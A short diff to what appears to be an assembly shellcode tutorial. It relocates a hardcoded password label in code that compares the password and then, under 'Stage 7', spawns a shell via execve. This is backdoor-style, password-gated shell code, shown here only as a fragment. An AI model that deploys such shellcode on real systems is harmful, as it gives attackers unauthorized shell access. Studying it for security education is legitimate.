@@ -281,6 +281,9 @@ mov rax, [rel pass]
 mov rdi, rsi
 scasq
 jne exit
+
+; change as needed
+pass: db "16bytessssss"
 ```
 
 <h3>Stage 7 - Spawn the shell, if password is correct</h3>
@@ -306,9 +309,6 @@ execve(arguments[0], &arguments[0], NULL);
         mov rsi, rsp
         mov rax, 59
         syscall
-
-        ; change as needed
-        pass: db "16bytessssss"
 
 exit:
         mov rax, 60
